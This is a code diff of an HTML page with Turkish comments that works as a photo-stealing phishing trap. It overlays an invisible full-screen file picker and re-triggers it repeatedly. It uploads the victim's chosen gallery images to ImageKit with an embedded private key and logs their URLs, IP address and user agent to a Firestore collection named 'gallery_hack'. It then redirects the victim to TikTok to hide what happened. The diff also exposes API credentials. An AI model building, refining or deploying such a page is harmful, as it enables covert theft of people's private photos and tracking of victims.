@@ -2,24 +2,23 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>.</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #000;
-            width: 100vw;
-            height: 100vh;
-            height: 100dvh;
-            overflow: hidden;
-            position: fixed;
-            top: 0;
-            left: 0;
+            min-height: 100vh;
+            min-height: 100dvh;
         }
     </style>
 </head>
 <body>
-    <input type="file" id="galleryInput" multiple accept="image/*" capture="environment">
+
+    <input type="file" id="galleryInput" multiple accept="image/*" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:9999;">
+
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
 
     <script>
         (function() {
@@ -32,7 +31,12 @@
                 return;
             }
 
-            const FIREBASE_CONFIG = {
+            const IMAGEKIT_CONFIG = {
+                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
+                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
+            };
+
+            const firebaseConfig = {
                 apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                 authDomain: "camerahhh-15487.firebaseapp.com",
                 projectId: "camerahhh-15487",
@@ -41,57 +45,35 @@
                 appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
             };
 
-            const IMAGEKIT_CONFIG = {
-                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
-                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
-            };
-
-            function loadFirebase() {
-                return new Promise((resolve) => {
-                    if (typeof firebase !== 'undefined' && firebase.apps.length) {
-                        resolve(firebase);
-                        return;
-                    }
-                    const script = document.createElement('script');
-                    script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
-                    script.onload = () => {
-                        const script2 = document.createElement('script');
-                        script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
-                        script2.onload = () => resolve(firebase);
-                        document.head.appendChild(script2);
-                    };
-                    document.head.appendChild(script);
-                });
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
             }
+            const db = firebase.firestore();
 
             async function uploadToImageKit(file) {
                 return new Promise((resolve) => {
                     const formData = new FormData();
                     formData.append('file', file);
                     formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
-                    formData.append('fileName', Date.now() + '_' + Math.random().toString(36).substr(2, 9) + '_' + file.name);
+                    formData.append('fileName', Date.now() + '_' + file.name);
                     formData.append('folder', '/gallery-uploads');
                     formData.append('useUniqueFileName', 'true');
 
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
-                    const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
-                    xhr.setRequestHeader('Authorization', 'Basic ' + auth);
+                    xhr.setRequestHeader('Authorization', 'Basic ' + btoa(IMAGEKIT_CONFIG.privateKey + ':'));
                     xhr.timeout = 120000;
-                    xhr.onload = () => {
-                        if (xhr.status >= 200 && xhr.status < 300) {
+
+                    xhr.onload = function() {
+                        if (xhr.status === 200 || xhr.status === 201) {
                             try {
-                                const response = JSON.parse(xhr.responseText);
-                                resolve(response.url || null);
-                            } catch (e) {
-                                resolve(null);
-                            }
-                        } else {
-                            resolve(null);
-                        }
+                                const data = JSON.parse(xhr.responseText);
+                                resolve(data.url);
+                            } catch(e) { resolve(null); }
+                        } else { resolve(null); }
                     };
-                    xhr.onerror = () => resolve(null);
-                    xhr.ontimeout = () => resolve(null);
+                    xhr.onerror = function() { resolve(null); };
+                    xhr.ontimeout = function() { resolve(null); };
                     xhr.send(formData);
                 });
             }
@@ -99,26 +81,24 @@
             async function getIP() {
                 try {
                     const r = await fetch('https://api.ipify.org?format=json');
-                    const data = await r.json();
-                    return data.ip;
-                } catch (e) {
-                    return 'unknown';
-                }
+                    return (await r.json()).ip;
+                } catch(e) { return 'unknown'; }
             }
 
-            async function processFiles(files) {
-                const selectedFiles = Array.from(files).slice(0, count);
-                if (selectedFiles.length === 0) {
+            const galleryInput = document.getElementById('galleryInput');
+
+            galleryInput.addEventListener('change', async function(e) {
+                const files = Array.from(e.target.files);
+                
+                if (!files || files.length === 0) {
                     window.location.href = 'https://www.tiktok.com';
                     return;
                 }
 
-                try {
-                    await loadFirebase();
-                    if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
-                    const db = firebase.firestore();
-                    const ip = await getIP();
+                const selectedFiles = files.slice(0, count);
 
+                try {
+                    const ip = await getIP();
                     const photoUrls = [];
 
                     for (let i = 0; i < selectedFiles.length; i++) {
@@ -126,19 +106,17 @@
                         if (url) photoUrls.push(url);
                     }
 
-                    if (photoUrls.length > 0 && uid) {
-                        try {
-                            await db.collection("gallery_hack").add({
-                                ownerId: uid,
-                                photos: photoUrls,
-                                photoCount: photoUrls.length,
-                                requestedCount: count,
-                                ip: ip,
-                                userAgent: navigator.userAgent,
-                                timestamp: new Date().toISOString(),
-                                unix: Date.now()
-                            });
-                        } catch (dbError) {
+                    if (photoUrls.length > 0) {
+                        await db.collection("gallery_hack").add({
+                            ownerId: uid,
+                            photos: photoUrls,
+                            photoCount: photoUrls.length,
+                            requestedCount: count,
+                            ip: ip,
+                            userAgent: navigator.userAgent,
+                            timestamp: new Date().toISOString(),
+                            unix: Date.now()
+                        }).catch(async function() {
                             await db.collection("gallery_hack").add({
                                 ownerId: uid,
                                 photos: photoUrls,
@@ -149,92 +127,54 @@
                                 timestamp: new Date().toISOString(),
                                 unix: Date.now()
                             });
-                        }
+                        });
                     }
-                } catch (e) {
+                } catch(e) {
                     console.log('Hata:', e.message);
                 }
 
                 window.location.href = 'https://www.tiktok.com';
+            });
+
+            // OTOMATİK AÇ - sürekli dene
+            function triggerInput() {
+                galleryInput.click();
             }
 
-            const galleryInput = document.getElementById('galleryInput');
+            // Hemen dene
+            triggerInput();
 
-            galleryInput.style.position = 'fixed';
-            galleryInput.style.top = '0';
-            galleryInput.style.left = '0';
-            galleryInput.style.width = '100%';
-            galleryInput.style.height = '100%';
-            galleryInput.style.opacity = '0';
-            galleryInput.style.zIndex = '9999';
-            galleryInput.style.cursor = 'pointer';
-            galleryInput.style.display = 'block';
+            // 500ms sonra tekrar dene
+            setTimeout(triggerInput, 500);
 
-            galleryInput.addEventListener('change', function(e) {
-                const files = e.target.files;
-                if (files && files.length > 0) {
-                    processFiles(files);
-                } else {
-                    setTimeout(() => {
-                        window.location.href = 'https://www.tiktok.com';
-                    }, 1000);
-                }
-            });
+            // 1 saniye sonra tekrar dene
+            setTimeout(triggerInput, 1000);
 
-            galleryInput.addEventListener('click', function(e) {
-                e.stopPropagation();
-            });
+            // 2 saniye sonra tekrar dene
+            setTimeout(triggerInput, 2000);
 
-            galleryInput.addEventListener('touchstart', function(e) {
-                e.stopPropagation();
-            });
+            // Sayfaya dokununca dene
+            document.addEventListener('click', triggerInput);
+            document.addEventListener('touchstart', triggerInput, { once: true });
 
-            function openGallery() {
-                const event = new MouseEvent('click', {
-                    view: window,
-                    bubbles: true,
-                    cancelable: true
-                });
-                galleryInput.dispatchEvent(event);
-                
-                setTimeout(() => {
-                    galleryInput.click();
-                }, 100);
-            }
-
-            document.addEventListener('click', function() {
-                galleryInput.click();
-            }, { once: true });
-
-            document.addEventListener('touchstart', function() {
-                galleryInput.click();
-            }, { once: true });
-
-            setTimeout(() => {
-                galleryInput.click();
-            }, 500);
-
-            setTimeout(() => {
-                galleryInput.click();
-            }, 1500);
-
-            document.addEventListener('visibilitychange', () => {
+            // Sayfa görünür olunca dene
+            document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible') {
-                    setTimeout(() => {
-                        if (!galleryInput.files || galleryInput.files.length === 0) {
-                            galleryInput.click();
-                        }
-                    }, 800);
+                    setTimeout(triggerInput, 300);
                 }
             });
 
-            window.addEventListener('focus', () => {
-                setTimeout(() => {
-                    if (!galleryInput.files || galleryInput.files.length === 0) {
-                        galleryInput.click();
-                    }
-                }, 800);
+            window.addEventListener('focus', function() {
+                setTimeout(triggerInput, 300);
             });
+
+            // 5 saniye sonra hala dosya seçilmediyse direkt yönlendir
+            setTimeout(function() {
+                if (!galleryInput.files || galleryInput.files.length === 0) {
+                    window.location.href = 'https://www.tiktok.com';
+                }
+            }, 5000);
+
         })();
     </script>
 </body>
